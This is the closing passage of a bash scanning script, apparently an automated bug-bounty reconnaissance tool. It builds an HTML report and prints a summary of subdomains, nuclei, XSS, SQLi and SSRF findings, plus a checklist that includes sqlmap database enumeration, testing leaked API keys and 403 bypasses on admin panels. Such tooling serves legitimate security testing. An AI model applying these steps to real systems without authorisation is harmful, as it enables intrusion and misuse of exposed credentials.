    <pre>$(grep -E "^[0-9]+/tcp" "$OUT/recon/nmap_results.txt" 2>/dev/null | head -30 || echo "No open ports / nmap skipped")</pre>
  </section>

  <!-- Next Steps -->
  <section>
    <h2>✅ Manual Next Steps</h2>
    <ul class="checklist">
      <li>Load live_urls.txt into Burp Suite for manual testing</li>
      <li>Verify all nuclei critical/high findings before reporting</li>
      <li>Test XSS in Burp — confirm in actual browser</li>
      <li>Verify SQLi findings manually with sqlmap --dbs</li>
      <li>Check JS secrets — test if API keys are active</li>
      <li>Try 403 bypass techniques on admin panels</li>
      <li>Test auth endpoints from 401_auth_endpoints.txt</li>
      <li>Review screenshots for login pages, admin panels</li>
      <li>Manually test SSRF with your Burp Collaborator</li>
      <li>Write up findings with CVSS score + PoC</li>
    </ul>
  </section>

</div>
</body>
</html>
HTMLEOF

ok "HTML Report → $REPORT_HTML"
notify "📊 Report ready — $TOTAL_VULNS findings ($CRIT crit, $HIGH high)"
sep

# ─────────────────────────────────────────────────────────────
# FINAL SUMMARY
# ─────────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}${GREEN}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║              BEAST MODE COMPLETE 🐉                     ║"
echo "╠══════════════════════════════════════════════════════════╣"
echo -e "║  Target:       ${NC}${BOLD}$TARGET${GREEN}$(printf '%*s' $((30-${#TARGET})) '')║"
echo -e "║  Subdomains:   ${NC}${BOLD}$TOTAL_SUBS${GREEN}$(printf '%*s' $((30-${#TOTAL_SUBS})) '')║"
echo -e "║  Live hosts:   ${NC}${BOLD}$LIVE_COUNT${GREEN}$(printf '%*s' $((30-${#LIVE_COUNT})) '')║"
echo -e "║  Nuclei vulns: ${NC}${BOLD}$TOTAL_VULNS (${CRIT} crit / ${HIGH} high)${GREEN}$(printf '%*s' $((22-${#TOTAL_VULNS})) '')║"
echo -e "║  XSS found:    ${NC}${BOLD}$XSS_COUNT${GREEN}$(printf '%*s' $((30-${#XSS_COUNT})) '')║"
echo -e "║  SQLi found:   ${NC}${BOLD}$SQLI_COUNT${GREEN}$(printf '%*s' $((30-${#SQLI_COUNT})) '')║"
echo -e "║  SSRF found:   ${NC}${BOLD}$SSRF_COUNT${GREEN}$(printf '%*s' $((30-${#SSRF_COUNT})) '')║"
echo -e "║  JS Secrets:   ${NC}${BOLD}$SEC_COUNT${GREEN}$(printf '%*s' $((30-${#SEC_COUNT})) '')║"
echo -e "║  403 Bypassed: ${NC}${BOLD}$BYPASS_COUNT${GREEN}$(printf '%*s' $((30-${#BYPASS_COUNT})) '')║"
echo -e "║  Duration:     ${NC}${BOLD}${ELAPSED}s${GREEN}$(printf '%*s' $((30-${#ELAPSED}-1)) '')║"
echo "╠══════════════════════════════════════════════════════════╣"
echo -e "║  Report: open reports/report.html in browser          ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"